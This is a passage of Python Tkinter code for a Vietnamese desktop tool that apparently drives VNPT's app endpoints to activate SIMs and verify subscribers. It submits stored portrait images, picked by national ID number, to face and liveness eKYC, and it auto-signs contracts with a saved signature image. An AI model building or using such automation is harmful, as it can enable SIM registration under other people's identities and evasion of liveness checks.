    active_sim_portrait_hint = mklbl(
        active_sim_box, '', fg=SUB, size=8,
        wraplength=630, justify='left', anchor='w')
    active_sim_portrait_hint.pack(fill='x', pady=(0, 3))

    def _refresh_active_sim_portrait_ui(_event=None):
        folder_mode = active_sim_portrait_mode_var.get() == 'folder'
        entry_state = 'disabled' if folder_mode else 'normal'
        e_active_sim_portrait.config(state=entry_state)
        active_sim_portrait_browse_btn.config(
            state='disabled' if folder_mode else 'normal')
        digits = re.sub(r'\D', '', e_active_sim_cccd.get().strip())
        if folder_mode:
            expected_name = f'{digits}.png' if digits else '<Số CCCD>.png'
            active_sim_portrait_hint.config(
                text=f'Sẽ dùng đúng file: {os.path.join(TEMP_FACES_DIR, expected_name)}',
                fg=YEL,
            )
        else:
            active_sim_portrait_hint.config(
                text='Chọn một ảnh cố định; ảnh này chỉ dùng cho lượt ACTIVE_SIM hiện tại.',
                fg=SUB,
            )

    for _portrait_radio in active_sim_portrait_mode_row.winfo_children():
        if isinstance(_portrait_radio, tk.Radiobutton):
            _portrait_radio.config(command=_refresh_active_sim_portrait_ui)
    e_active_sim_cccd.bind('<KeyRelease>', _refresh_active_sim_portrait_ui, add='+')
    _refresh_active_sim_portrait_ui()

    active_sim_sign_row = tk.Frame(active_sim_box, bg=BG)
    active_sim_sign_row.pack(fill='x', pady=2)
    mklbl(active_sim_sign_row, 'Ảnh chữ ký (PNG):', bold=True, width=18, size=9).pack(side='left')
    e_active_sim_sign = mkentry(active_sim_sign_row, width=22)
    e_active_sim_sign.pack(side='left', padx=(5, 4), ipady=3)
    _default_sig_path = os.path.join(BASE_DIR, 'anh', 'chu_ky.png')
    if os.path.isfile(_default_sig_path):
        e_active_sim_sign.insert(0, _default_sig_path)
    def _browse_active_sim_sign():
        from tkinter import filedialog
        f = filedialog.askopenfilename(
            title='Chọn ảnh chữ ký viết tay (PNG/JPG)',
            filetypes=[('Ảnh chữ ký', '*.png *.jpg *.jpeg'), ('Tất cả', '*.*')])
        if f:
            e_active_sim_sign.delete(0, 'end')
            e_active_sim_sign.insert(0, f)
    mkbtn(active_sim_sign_row, 'Chọn file...', _browse_active_sim_sign, bg=CARD, fg=FG, size=8).pack(side='left')

    mklbl(
        active_sim_box,
        'Chọn sẵn ảnh chữ ký; CHẠY TOÀN BỘ sẽ tự ghép và gửi hợp đồng sau một lần xác nhận.',
        fg=YEL, size=8, wraplength=630, justify='left', anchor='w'
    ).pack(fill='x', pady=(0, 4))

    active_sim_action_row = tk.Frame(active_sim_box, bg=BG)
    active_sim_action_row.pack(fill='x', pady=(2, 3))
    active_sim_busy = {'value': False}

    def _prepare_active_sim_portrait(cccd_number, required=False):
        """Resolve only the UI-selected portrait source and normalize to JPEG."""
        if not required:
            return ''
        mode = active_sim_portrait_mode_var.get().strip().lower()
        if mode == 'fixed':
            source_path = e_active_sim_portrait.get().strip()
            if not source_path:
                raise EsimRegistrationError(
                    'Chọn ảnh chân dung cố định trước khi chạy ACTIVE_SIM.')
            source_label = 'ảnh chân dung cố định'
        elif mode == 'folder':
            if not cccd_number:
                raise EsimRegistrationError(
                    'Nhập số CCCD để lấy ảnh theo tên <CCCD>.png.')
            source_path = os.path.join(TEMP_FACES_DIR, f'{cccd_number}.png')
            source_label = f'anh/{cccd_number}.png'
        else:
            raise EsimRegistrationError('Nguồn ảnh chân dung không hợp lệ.')

        if (not os.path.isfile(source_path) or
                os.path.getsize(source_path) <= 128):
            raise EsimRegistrationError(
                f'Không tìm thấy {source_label} hợp lệ: {source_path}')
        try:
            from PIL import Image as _PortraitImage, ImageOps as _PortraitImageOps
            with _PortraitImage.open(source_path) as opened:
                portrait_image = _PortraitImageOps.exif_transpose(opened)
                portrait_image.load()
                if portrait_image.width < 100 or portrait_image.height < 100:
                    raise ValueError('kích thước phải tối thiểu 100x100 px')
                normalized_path = os.path.join(
                    SESSION_TEMP_DIR,
                    f'active_sim_portrait_{cccd_number}_{uuid.uuid4().hex}.jpg',
                )
                portrait_image.convert('RGB').save(
                    normalized_path, 'JPEG', quality=95)
        except Exception as exc:
            raise EsimRegistrationError(
                f'Ảnh chân dung không hợp lệ ({source_path}): {exc}') from exc
        return normalized_path

    def _active_sim_config(require_cccd=False, require_signature=False,
                           require_portrait=False):
        # Match the source guest flow: the first regCheckInfo request carries
        # empty inherited msisdn/session fields.  Its response supplies the
        # activeToken and MSISDN used by all following ACTIVE_SIM requests.
        phone = ''
        msisdn = ''
        cccd_number = re.sub(r'\D', '', e_active_sim_cccd.get().strip())
        if require_cccd and not re.fullmatch(r'\d{9,12}', cccd_number):
            raise EsimRegistrationError('Nhập số CCCD hợp lệ trước khi chạy eKYC.')
        serial = e_active_sim_serial.get().strip()
        if not serial:
            raise EsimRegistrationError('Nhập Serial SIM trước khi chạy ACTIVE_SIM.')
        signature_file = e_active_sim_sign.get().strip()
        if require_signature and (
                not signature_file or not os.path.isfile(signature_file) or
                os.path.getsize(signature_file) <= 128):
            raise EsimRegistrationError(
                'Chọn ảnh chữ ký PNG/JPG hợp lệ trước khi chạy toàn bộ ACTIVE_SIM.')
        portrait_file = _prepare_active_sim_portrait(
            cccd_number, required=require_portrait)
        digits = re.sub(r'\D', '', phone) or re.sub(r'\D', '', serial) or 'active'
        result_file = os.path.join(HISTORY_DIR, f'active_sim_result_{digits}.json')
        cfg = {
            'serial': serial,
            'serial_sim': serial,
            'auto_active_sim_context': True,
            'force_guest_active_sim': True,
            'active_sim_session_file': ACTIVE_SIM_SESSION_JSON,
            'msisdn': msisdn,
            'target_msisdn': msisdn,
            'auth_msisdn': '',
            # Guest challenge fields are internal state collected from the
            # source app; they are never rendered as customer inputs.
            'guest_msisdn': '',
            'guest_token': '',
            'authen_code': 'REUSE_INFO',
            'authen_method': 'REUSE_INFO',
            'cccd_number': cccd_number,
            'portrait': portrait_file,
            'portrait_path': portrait_file,
            'face_path': portrait_file,
            'portrait_mode': active_sim_portrait_mode_var.get().strip().lower(),
            'disable_auto_portrait_lookup': True,
            'signature_file': signature_file,
            'result_file': result_file,
        }
        return cfg

    def _active_sim_show_result(title, result, max_chars=7000):
        try:
            rendered = json.dumps(_active_sim_redact_tokens(result),
                                  ensure_ascii=False, indent=2, default=str)
        except Exception:
            rendered = str(result)
        if len(rendered) > max_chars:
            rendered = rendered[:max_chars] + '\n... (đã rút gọn)'
        active_sim_log(f'[{title}]\n{rendered}')

    def _active_sim_open_contract(result):
        """Move the desktop flow to the contract-signing screen when a URL exists."""
        contract_url = str(result.get('contract_url') or '').strip()
        if not contract_url:
            active_sim_log('[ACTIVE_SIM] Hợp đồng đã tạo; response chưa có link ký.')
            return
        try:
            import webbrowser
            webbrowser.open(contract_url)
            active_sim_log('[ACTIVE_SIM] Đã mở link để ký hợp đồng.')
        except Exception as exc:
            active_sim_log(f'[ACTIVE_SIM] Không tự mở được link ký: {exc}')

    def _active_sim_discover():
        try:
            cfg = _active_sim_config()
        except Exception as exc:
            active_sim_log(f'[ACTIVE_SIM] LỖI NHẬP LIỆU: {exc}')
            set_status(str(exc), ERR)
            return
        if active_sim_busy['value']:
            return
        active_sim_busy['value'] = True
        set_status('Đang tải dữ liệu SIM chờ kích hoạt...', YEL)

        def worker():
            try:
                result = run_active_sim_discovery(cfg, log_cb=active_sim_log)
                _active_sim_show_result('DISCOVERY OK', {
                    'cutoff': result.get('cutoff'),
                    'active_sims': result.get('active_sims'),
                    'auth_methods': result.get('auth_methods'),
                    'selected_sim': result.get('selected_sim'),
                })
                set_status('ACTIVE_SIM: đã tải danh sách SIM và phương thức xác thực.', OK)
            except Exception as exc:
                active_sim_log(f'[ACTIVE_SIM] Discovery lỗi: {exc}')
                set_status(f'ACTIVE_SIM discovery lỗi: {str(exc)[:100]}', ERR)
            finally:
                active_sim_busy['value'] = False

        threading.Thread(target=worker, daemon=True).start()

    def _active_sim_confirm_info(preview):
        """Confirm the identity information before opening the contract step."""
        from tkinter import messagebox
        decision = {'value': False}
        done = threading.Event()
        serial = str(preview.get('serial') or '(chưa có)')
        authen_code = str(preview.get('authenCode') or 'REUSE_INFO')

        def show_dialog():
            try:
                decision['value'] = bool(messagebox.askyesno(
                    'Xác nhận thông tin kích hoạt SIM',
                    'Xác thực khuôn mặt và tra cứu danh tính đã hoàn tất.\n\n'
                    f'Serial SIM: {serial}\n'
                    f'Phương thức: {authen_code}\n\n'
                    'Bạn xác nhận thông tin trên là chính xác và tiếp tục '
                    'đến bước hợp đồng không?',
                    parent=root,
                ))
            finally:
                done.set()

        root.after(0, show_dialog)
        if not done.wait(timeout=600):
            active_sim_log('[ACTIVE_SIM] Hết thời gian chờ xác nhận thông tin.')
            return False
        if not decision['value']:
            active_sim_log('[ACTIVE_SIM] Người dùng chưa xác nhận; chưa mở bước hợp đồng.')
        return decision['value']

    def _get_active_sim_signature_file():
        custom = e_active_sim_sign.get().strip()
        if custom and os.path.isfile(custom) and os.path.getsize(custom) > 128:
            return custom
        candidates = [
            os.path.join(BASE_DIR, 'anh', 'chu_ky.png'),
            os.path.join(BASE_DIR, 'anh', 'signature.png'),
            os.path.join(BASE_DIR, 'chu_ky.png'),
            os.path.join(BASE_DIR, 'signature.png'),
        ]
        for c in candidates:
            if os.path.isfile(c) and os.path.getsize(c) > 128:
                return c
        return None

    def _active_sim_submit_signature_btn():
        """Retry signing a prepared ACTIVE_SIM contract when necessary."""
        from tkinter import filedialog
        try:
            cfg = _active_sim_config()
        except Exception as exc:
            set_status(str(exc), ERR)
            return
        result_file = cfg['result_file']
        if not os.path.isfile(result_file):
            active_sim_log('[ACTIVE_SIM] Chưa có file hợp đồng của SIM này.')
            set_status('Chưa có hợp đồng.', ERR)
            return
        sig_file = _get_active_sim_signature_file()
        if not sig_file:
            sig_file = filedialog.askopenfilename(
                title='Chọn ảnh chữ ký viết tay (PNG/JPG)',
                filetypes=[('Ảnh chữ ký', '*.png *.jpg *.jpeg'), ('Tất cả', '*.*')])
        if not sig_file or not os.path.isfile(sig_file):
            return
        set_status('⏳ Đang ghép chữ ký và gửi hợp đồng ACTIVE_SIM...', YEL)
        active_sim_log(f'[ACTIVE_SIM] Upload ảnh chữ ký: {os.path.basename(sig_file)}')
        def _worker():
            try:
                signed = run_active_sim_submit_signature(
                    cfg, sig_file, log_cb=active_sim_log)
                if signed.get('status') == 'active_sim_video_call_required':
                    active_sim_log(
                        '[ACTIVE_SIM] Đã gửi hợp đồng; phản hồi VNPT yêu cầu video call.')
                    set_status('ACTIVE_SIM: VNPT yêu cầu video call.', YEL)
                else:
                    active_sim_log(
                        '[ACTIVE_SIM] ✅ ĐÃ GỬI HỢP ĐỒNG CÓ CHỮ KÝ THÀNH CÔNG!')
                    set_status('✅ ACTIVE_SIM đã gửi hợp đồng có chữ ký.', OK)
            except Exception as exc:
                active_sim_log(f'[ACTIVE_SIM] Lỗi upload chữ ký: {exc}')
                set_status(f'Lỗi upload chữ ký: {str(exc)[:80]}', ERR)
        threading.Thread(target=_worker, daemon=True).start()

    def _run_active_sim_full():
        """serial -> REUSE_INFO -> face -> confirm -> sign and submit."""
        try:
            cfg = _active_sim_config(
                require_cccd=True,
                require_signature=True,
                require_portrait=True,
            )
        except Exception as exc:
            active_sim_log(f'[ACTIVE_SIM] LỖI NHẬP LIỆU: {exc}')
            set_status(str(exc), ERR)
            return
        if active_sim_busy['value']:
            return
        active_sim_busy['value'] = True

        case_label = (cfg.get('msisdn') or cfg.get('target_msisdn') or
                      cfg.get('serial') or '(guest ACTIVE_SIM)')
        result_file = cfg['result_file']
        active_sim_log_area.config(state='normal')
        active_sim_log_area.delete('1.0', 'end')
        active_sim_log_area.config(state='disabled')
        set_status('⏳ Đang chạy kích hoạt SIM mới...', YEL)
        active_sim_log(f'[ACTIVE_SIM] === BẮT ĐẦU KÍCH HOẠT SIM MỚI CHO {case_label} ===')

        def _full_worker():
            try:
                active_sim_log('[ACTIVE_SIM] Bước 1/6: Tải danh sách SIM + phương thức xác thực...')
                discovery = run_active_sim_discovery(cfg, log_cb=active_sim_log)
                cfg['selected_sim'] = discovery.get('selected_sim') or {}
                _active_sim_show_result('DISCOVERY OK', {
                    'active_sims': discovery.get('active_sims'),
                    'auth_methods': discovery.get('auth_methods'),
                    'selected_sim': discovery.get('selected_sim'),
                })
                active_sim_log('[ACTIVE_SIM] Bước 2/6: Hoàn tất regCheckInfo và trạng thái chọn phương thức...')
                reg_result = discovery.get('reg_check_result')
                if not isinstance(reg_result, dict) or not reg_result:
                    reg_result = run_active_sim_reg_check(
                        cfg, log_cb=active_sim_log)
                cfg['reg_check_result'] = reg_result
                if reg_result.get('trans_id'):
                    cfg['trans_id'] = reg_result['trans_id']
                if reg_result.get('order_id'):
                    cfg['request_order_id'] = reg_result['order_id']
                if reg_result.get('province'):
                    cfg['province'] = reg_result['province']
                cfg['activation_session'] = reg_result.get('activation_session') or ''
                cfg['token_active'] = reg_result.get('active_token') or ''
                _active_sim_show_result('REG_CHECK OK', reg_result)

                active_sim_log(
                    '[ACTIVE_SIM] Bước 3/6: REUSE_INFO dùng số CCCD; '
                    'không tải/OCR ảnh CCCD từ CBSS hoặc OneBSS.')

                if cfg.get('portrait_mode') == 'folder':
                    active_sim_log(
                        f'[ACTIVE_SIM] Ảnh khuôn mặt: anh/{cfg["cccd_number"]}.png '
                        '(đã chuẩn hóa JPEG; không tự tra cứu ảnh).')
                else:
                    active_sim_log(
                        '[ACTIVE_SIM] Ảnh khuôn mặt: ảnh cố định đã chọn '
                        '(đã chuẩn hóa JPEG; không tự tra cứu ảnh).')

                active_sim_log('[ACTIVE_SIM] Bước 4/6: Xác thực khuôn mặt + liveness...')
                set_status('⏳ Đang xác thực khuôn mặt + liveness...', YEL)
                ekyc_result = run_active_sim_ekyc(
                    cfg, log_cb=active_sim_log,
                    confirm_callback=_active_sim_confirm_info)
                active_sim_log(
                    '[ACTIVE_SIM] eKYC đã xác minh; dữ liệu hợp đồng trả trước đã sẵn sàng.')
                sig_file = cfg['signature_file']
                active_sim_log(
                    f'[ACTIVE_SIM] Tự động ghép và gửi chữ ký: {os.path.basename(sig_file)}')
                signed = run_active_sim_submit_signature(
                    cfg, sig_file, log_cb=active_sim_log)
                if signed.get('status') == 'active_sim_video_call_required':
                    active_sim_log(
                        '[ACTIVE_SIM] Đã gửi hợp đồng; phản hồi VNPT yêu cầu video call.')
                    set_status('ACTIVE_SIM: VNPT yêu cầu video call.', YEL)
                else:
                    active_sim_log(
                        '[ACTIVE_SIM] ✅ ĐÃ TỰ ĐỘNG GỬI HỢP ĐỒNG CÓ CHỮ KÝ THÀNH CÔNG!')
                    set_status('✅ ACTIVE_SIM đã hoàn tất.', OK)
            except Exception as exc:
                active_sim_log(f'[ACTIVE_SIM] THẤT BẠI: {exc}')
                set_status(f'Kích hoạt SIM lỗi: {str(exc)[:80]}', ERR)
            finally:
                active_sim_busy['value'] = False

        threading.Thread(target=_full_worker, daemon=True).start()

    def _active_sim_run_ekyc():
        """Chạy eKYC khuôn mặt + liveness 3D và chuẩn bị hợp đồng."""
        try:
            cfg = _active_sim_config(
                require_cccd=True,
                require_signature=True,
                require_portrait=True,
            )
        except Exception as exc:
            active_sim_log(f'[ACTIVE_SIM] LỖI NHẬP LIỆU: {exc}')
            set_status(str(exc), ERR)
            return
        if active_sim_busy['value']:
            return
        active_sim_busy['value'] = True
        set_status('⏳ Đang chạy IDG eKYC + liveness...', YEL)
        active_sim_log('[ACTIVE_SIM] Bắt đầu eKYC khuôn mặt và chuẩn bị hợp đồng...')

        def _worker():
            try:
                discovery = run_active_sim_discovery(cfg, log_cb=active_sim_log)
                cfg['selected_sim'] = discovery.get('selected_sim') or {}
                _active_sim_show_result('DISCOVERY OK', {
                    'active_sims': discovery.get('active_sims'),
                    'auth_methods': discovery.get('auth_methods'),
                    'selected_sim': discovery.get('selected_sim'),
                })
                reg_result = discovery.get('reg_check_result')
                if not isinstance(reg_result, dict) or not reg_result:
                    reg_result = run_active_sim_reg_check(
                        cfg, log_cb=active_sim_log)
                cfg['reg_check_result'] = reg_result
                if reg_result.get('trans_id'):
                    cfg['trans_id'] = reg_result['trans_id']
                if reg_result.get('order_id'):
                    cfg['request_order_id'] = reg_result['order_id']
                if reg_result.get('province'):
                    cfg['province'] = reg_result['province']
                cfg['activation_session'] = reg_result.get('activation_session') or ''
                cfg['token_active'] = reg_result.get('active_token') or ''
                result = run_active_sim_ekyc(
                    cfg, log_cb=active_sim_log,
                    confirm_callback=_active_sim_confirm_info)
                active_sim_log(
                    '[ACTIVE_SIM] eKYC thành công; dữ liệu hợp đồng trả trước đã sẵn sàng.')
                sig_file = cfg['signature_file']
                active_sim_log(
                    f'[ACTIVE_SIM] Tự động ghép và gửi chữ ký: {os.path.basename(sig_file)}')
                signed = run_active_sim_submit_signature(
                    cfg, sig_file, log_cb=active_sim_log)
                if signed.get('status') == 'active_sim_video_call_required':
                    active_sim_log(
                        '[ACTIVE_SIM] Đã gửi hợp đồng; phản hồi VNPT yêu cầu video call.')
                    set_status('ACTIVE_SIM: VNPT yêu cầu video call.', YEL)
                else:
                    active_sim_log(
                        '[ACTIVE_SIM] ✅ ĐÃ TỰ ĐỘNG GỬI HỢP ĐỒNG CÓ CHỮ KÝ THÀNH CÔNG!')
                    set_status('✅ ACTIVE_SIM đã hoàn tất.', OK)
            except Exception as exc:
                active_sim_log(f'[ACTIVE_SIM] eKYC lỗi: {exc}')
                set_status(f'eKYC lỗi: {str(exc)[:80]}', ERR)
            finally:
                active_sim_busy['value'] = False

        threading.Thread(target=_worker, daemon=True).start()

    mkbtn(active_sim_action_row, '  ▶  CHẠY TOÀN BỘ KÍCH HOẠT SIM  ', _run_active_sim_full,
          bg='#a6e3a1', fg='#1e1e2e', size=11).pack(side='left')

    mklbl(
        active_sim_box,
        'Quy trình tự động: chọn nguồn ảnh mặt + ảnh chữ ký → serial SIM + CCCD → REUSE_INFO → eKYC khuôn mặt → xác nhận một lần → tự ghép và gửi hợp đồng.',
        fg=OK, size=8, wraplength=630, justify='left', anchor='w'
    ).pack(fill='x', pady=(4, 2))

    active_sim_log_hdr = tk.Frame(active_sim_box, bg=BG)
    active_sim_log_hdr.pack(fill='x', pady=(7, 0))
    mklbl(active_sim_log_hdr, ' Log ACTIVE_SIM:', bold=True, size=9, fg=ACC).pack(side='left')
    active_sim_auto_scroll_var = tk.BooleanVar(value=True)
    tk.Checkbutton(
        active_sim_log_hdr, text='Tự cuộn', variable=active_sim_auto_scroll_var,
        bg=BG, fg=SUB, activebackground=BG, activeforeground=FG,
        selectcolor=CARD, font=('Segoe UI', 8)
    ).pack(side='right')

    def _clear_active_sim_log():
        active_sim_log_area.config(state='normal')
        active_sim_log_area.delete('1.0', 'end')
        active_sim_log_area.config(state='disabled')

    tk.Button(
        active_sim_log_hdr, text='Xóa log', bg=CARD, fg=SUB,
        relief='flat', font=('Segoe UI', 8), padx=6,
        command=_clear_active_sim_log
    ).pack(side='right', padx=(0, 6))
    active_sim_log_area = tk.Text(
        active_sim_box, height=10, bg='#181825', fg='#a6e3a1',
        font=('Consolas', 8), relief='flat', state='disabled', wrap='word'
    )
    active_sim_log_area.pack(fill='both', expand=True, pady=(2, 0))
    root.after(80, _flush_active_sim_log)

    # ===== XÁC THỰC THÔNG TIN THUÊ BAO / UPDATE_INFO tab =====
    update_info_box = tk.LabelFrame(
        tab_update_info, text='  XÁC THỰC THÔNG TIN THUÊ BAO  ',
        bg=BG, fg=ACC, relief='groove', bd=1,
        font=('Segoe UI', 10, 'bold'), padx=8, pady=5
    )
    update_info_box.pack(fill='both', expand=True, pady=(2, 5))
    mklbl(
        update_info_box,
        'Đúng luồng app: đăng nhập My VNPT → OTP myvnpt_identification → '
        'chọn NFC → challenge → gửi kết quả SDK NFC + ảnh eKYC.',
        fg=SUB, size=8, justify='left', anchor='w', wraplength=680
    ).pack(fill='x', pady=(0, 4))

    def _update_info_entry_row(label, width=28, show=None):
        row = tk.Frame(update_info_box, bg=BG)
        row.pack(fill='x', pady=2)
        mklbl(row, label, bold=True, width=21, size=9).pack(side='left')
        entry = mkentry(row, width=width, show=show)
        entry.pack(side='left', padx=(5, 4), ipady=3)
        return row, entry

    _row, e_update_info_phone = _update_info_entry_row(
        'Số đăng nhập My VNPT:')
    _row, e_update_info_password = _update_info_entry_row(
        'Mật khẩu:', show='*')

    update_login_otp_row, e_update_info_login_otp = _update_info_entry_row(
        'OTP đăng nhập:', width=14)
    update_info_runtime = {'value': None}
    update_info_busy = {'value': False}

    def _update_info_set_status(text, color=SUB):
        root.after(0, lambda: update_info_status.config(text=text, fg=color))
        set_status(text, color)

    def _request_update_info_login_otp():
        phone = e_update_info_phone.get().strip()
        if not phone:
            _update_info_set_status('Nhập số My VNPT trước.', ERR)
            return
        if update_info_busy['value']:
            return
        update_info_busy['value'] = True
        _update_info_set_status('Đang gửi OTP đăng nhập My VNPT...', YEL)

        def worker():
            try:
                request_myvnpt_login_otp(phone, log_cb=update_info_log)
                _update_info_set_status(
                    'OTP đăng nhập đã gửi; nhập vào ô OTP đăng nhập.', OK)
            except Exception as exc:
                update_info_log(f'[UPDATE_INFO] LỖI OTP ĐĂNG NHẬP: {exc}')
                _update_info_set_status(str(exc), ERR)
            finally:
                update_info_busy['value'] = False

        threading.Thread(target=worker, daemon=True).start()

    mkbtn(
        update_login_otp_row, 'Gửi OTP đăng nhập',
        _request_update_info_login_otp, bg=CARD, fg=FG, size=8
    ).pack(side='left', padx=(4, 0))

    update_prepare_row = tk.Frame(update_info_box, bg=BG)
    update_prepare_row.pack(fill='x', pady=(3, 2))

    def _update_info_login_config():
        phone = e_update_info_phone.get().strip()
        password = e_update_info_password.get()
        login_otp = e_update_info_login_otp.get().strip()
        if not phone:
            raise EsimRegistrationError('Nhập số đăng nhập My VNPT.')
        if not password and not login_otp:
            raise EsimRegistrationError(
                'Nhập mật khẩu hoặc bấm gửi rồi nhập OTP đăng nhập.')
        return {
            'phone': phone,
            'password': password,
            'login_otp': login_otp,
            'session_file': UPDATE_INFO_SESSION_JSON,
        }

    def _prepare_update_info():
        try:
            cfg = _update_info_login_config()
        except Exception as exc:
            _update_info_set_status(str(exc), ERR)
            return
        if update_info_busy['value']:
            return
        update_info_busy['value'] = True
        update_info_runtime['value'] = None
        _update_info_set_status(
            'Đang đăng nhập và gửi OTP xác thực thuê bao...', YEL)
        update_info_log('[UPDATE_INFO] === BƯỚC 1: ĐĂNG NHẬP + GỬI OTP XÁC THỰC ===')

        def worker():
            try:
                result = run_update_info_prepare(
                    cfg, session_file=UPDATE_INFO_SESSION_JSON,
                    log_cb=update_info_log)
                update_info_log(
                    f'[UPDATE_INFO] OTP xác thực đã gửi tới {result["msisdn"]}.')
                _update_info_set_status(
                    'Đăng nhập OK; nhập OTP xác thực thuê bao ở bước 2.', OK)
            except Exception as exc:
                update_info_log(f'[UPDATE_INFO] BƯỚC 1 THẤT BẠI: {exc}')
                _update_info_set_status(str(exc), ERR)
            finally:
                update_info_busy['value'] = False

        threading.Thread(target=worker, daemon=True).start()

    mkbtn(
        update_prepare_row,
        '  1. ĐĂNG NHẬP + GỬI OTP XÁC THỰC  ',
        _prepare_update_info, bg='#89b4fa', fg='#1e1e2e', size=9
    ).pack(side='left')

    update_ident_row, e_update_info_ident_otp = _update_info_entry_row(
        'OTP xác thực thuê bao:', width=14)
    mklbl(
        update_ident_row, 'Khác OTP đăng nhập', fg=YEL, size=8
    ).pack(side='left', padx=(4, 0))

    update_method_row = tk.Frame(update_info_box, bg=BG)
    update_method_row.pack(fill='x', pady=2)
    mklbl(
        update_method_row, 'Phương thức xác thực:',
        bold=True, width=21, size=9
    ).pack(side='left')
    update_info_method_var = tk.StringVar(value='NFC')
    update_info_method_box = ttk.Combobox(
        update_method_row, textvariable=update_info_method_var,
        values=('NFC',), state='readonly', width=18
    )
    update_info_method_box.pack(side='left', padx=(5, 4), ipady=2)
    mklbl(
        update_method_row, 'theo source 3.4.09', fg=SUB, size=8
    ).pack(side='left')

    update_challenge_row = tk.Frame(update_info_box, bg=BG)
    update_challenge_row.pack(fill='x', pady=(2, 3))

    def _confirm_update_info_otp():
        otp = e_update_info_ident_otp.get().strip()
        if not otp:
            _update_info_set_status('Nhập OTP xác thực thuê bao.', ERR)
            return
        if not os.path.isfile(UPDATE_INFO_SESSION_JSON):
            _update_info_set_status(
                'Hãy hoàn tất bước 1 để tạo phiên đăng nhập.', ERR)
            return
        if update_info_busy['value']:
            return
        update_info_busy['value'] = True
        _update_info_set_status('Đang xác nhận OTP và lấy NFC challenge...', YEL)
        update_info_log('[UPDATE_INFO] === BƯỚC 2: OTP + AUTH METHODS + CHALLENGE ===')

        def worker():
            try:
                runtime = run_update_info_confirm_otp(
                    {
                        'identification_otp': otp,
                        'authen_method': update_info_method_var.get(),
                    },
                    session_file=UPDATE_INFO_SESSION_JSON,
                    log_cb=update_info_log,
                )
                update_info_runtime['value'] = runtime
                methods = [
                    str(item.get('authenCode') or '')
                    for item in runtime.get('auth_methods', [])
                    if isinstance(item, dict) and item.get('authenCode')
                ]
                root.after(0, lambda vals=tuple(methods):
                           update_info_method_box.config(values=vals or ('NFC',)))
                update_info_log(
                    '[UPDATE_INFO] Challenge sẵn sàng. Tiếp theo phải dùng '
                    'kết quả đọc chip thật từ VnptScanNFCActivity.')
                _update_info_set_status(
                    'OTP đúng; đã lấy challenge NFC. Chọn JSON SDK + 3 ảnh.', OK)
            except Exception as exc:
                update_info_runtime['value'] = None
                update_info_log(f'[UPDATE_INFO] BƯỚC 2 THẤT BẠI: {exc}')
                _update_info_set_status(str(exc), ERR)
            finally:
                update_info_busy['value'] = False

        threading.Thread(target=worker, daemon=True).start()

    mkbtn(
        update_challenge_row,
        '  2. XÁC NHẬN OTP + LẤY CHALLENGE NFC  ',
        _confirm_update_info_otp, bg='#f9e2af', fg='#1e1e2e', size=9
    ).pack(side='left')

    mklbl(
        update_info_box,
        'NFC phải là dữ liệu đọc chip thật từ Android SDK; không dựng NFC từ '
        'ảnh CCCD. JSON có DATA_NFC_RESULT, DATA_GROUPS_RESULT và hash ảnh chip.',
        fg=YEL, size=8, justify='left', anchor='w', wraplength=680
    ).pack(fill='x', pady=(2, 3))

    update_info_files = {}

    def _update_info_file_row(label, key, filetypes):
        row = tk.Frame(update_info_box, bg=BG)
        row.pack(fill='x', pady=1)
        mklbl(row, label, bold=True, width=21, size=8).pack(side='left')
        entry = mkentry(row, width=37)
        entry.pack(side='left', padx=(5, 4), ipady=2)
        update_info_files[key] = entry

        def browse():
            from tkinter import filedialog
            chosen = filedialog.askopenfilename(
                title=f'Chọn {label}', filetypes=filetypes)
            if chosen:
                entry.delete(0, 'end')
                entry.insert(0, chosen)

        mkbtn(
            row, 'Chọn...', browse, bg=CARD, fg=FG, size=8
        ).pack(side='left')
        return entry

    _update_info_file_row(
        'JSON kết quả NFC:', 'nfc_context_file',
        [('JSON NFC', '*.json'), ('Tất cả', '*.*')])
    _update_info_file_row(
        'Ảnh CCCD mặt trước:', 'front_image',
        [('Ảnh', '*.jpg *.jpeg *.png'), ('Tất cả', '*.*')])
    _update_info_file_row(
        'Ảnh CCCD mặt sau:', 'back_image',
        [('Ảnh', '*.jpg *.jpeg *.png'), ('Tất cả', '*.*')])
    _update_info_file_row(
        'Ảnh chân dung:', 'portrait_image',
        [('Ảnh', '*.jpg *.jpeg *.png'), ('Tất cả', '*.*')])

    update_submit_row = tk.Frame(update_info_box, bg=BG)
    update_submit_row.pack(fill='x', pady=(3, 2))

    def _submit_update_info_nfc():
        runtime = update_info_runtime.get('value')
        if not runtime:
            _update_info_set_status(
                'Hãy xác nhận OTP và lấy challenge ở bước 2 trước.', ERR)
            return
        cfg = {
            key: entry.get().strip()
            for key, entry in update_info_files.items()
        }
        if update_info_busy['value']:
            return
        update_info_busy['value'] = True
        _update_info_set_status('Đang gửi ekycVerifyVer4...', YEL)
        update_info_log('[UPDATE_INFO] === BƯỚC 3: GỬI NFC + ẢNH eKYC ===')

        def worker():
            try:
                result = run_update_info_submit_nfc(
                    cfg, runtime,
                    session_file=UPDATE_INFO_SESSION_JSON,
                    log_cb=update_info_log,
                )
                update_info_log(
                    '[UPDATE_INFO] ✅ XÁC THỰC THÔNG TIN THUÊ BAO THÀNH CÔNG!')
                _update_info_set_status(
                    f'✅ Đã xác thực thuê bao {result.get("msisdn", "")}.', OK)
            except Exception as exc:
                update_info_log(f'[UPDATE_INFO] BƯỚC 3 THẤT BẠI: {exc}')
                _update_info_set_status(str(exc), ERR)
            finally:
                update_info_busy['value'] = False

        threading.Thread(target=worker, daemon=True).start()

    mkbtn(
        update_submit_row,
        '  3. GỬI KẾT QUẢ NFC + HOÀN TẤT  ',
        _submit_update_info_nfc, bg='#a6e3a1', fg='#1e1e2e', size=9
    ).pack(side='left')

    update_info_status = mklbl(
        update_info_box,
        'Bước 1: đăng nhập bằng mật khẩu hoặc OTP đăng nhập My VNPT.',
        fg=SUB, size=8, justify='left', anchor='w', wraplength=680
    )
    update_info_status.pack(fill='x', pady=(2, 2))

    update_info_log_hdr = tk.Frame(update_info_box, bg=BG)
    update_info_log_hdr.pack(fill='x', pady=(3, 0))
    mklbl(
        update_info_log_hdr, ' Log UPDATE_INFO:',
        bold=True, size=9, fg=ACC
    ).pack(side='left')
    update_info_auto_scroll_var = tk.BooleanVar(value=True)
    tk.Checkbutton(
        update_info_log_hdr, text='Tự cuộn',
        variable=update_info_auto_scroll_var,
        bg=BG, fg=SUB, activebackground=BG, activeforeground=FG,
        selectcolor=CARD, font=('Segoe UI', 8)
    ).pack(side='right')

    def _clear_update_info_log():
        update_info_log_area.config(state='normal')
        update_info_log_area.delete('1.0', 'end')
        update_info_log_area.config(state='disabled')

    tk.Button(
